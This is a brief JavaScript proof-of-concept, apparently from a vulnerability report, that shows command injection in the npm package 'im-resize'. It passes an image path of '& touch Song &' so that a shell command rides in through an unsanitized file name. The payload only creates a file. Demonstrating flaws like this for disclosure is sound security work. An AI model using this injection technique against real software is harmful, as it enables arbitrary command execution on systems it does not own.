/**
 * the injection point is located in line 11 in index.js,
 * the cmd argument can be controlled by user without any sanitization
 */

var root = require('im-resize')
var image = {
"path": "& touch Song &"
}
var output ={
"versions":[]
}
root(image,output,function(){});
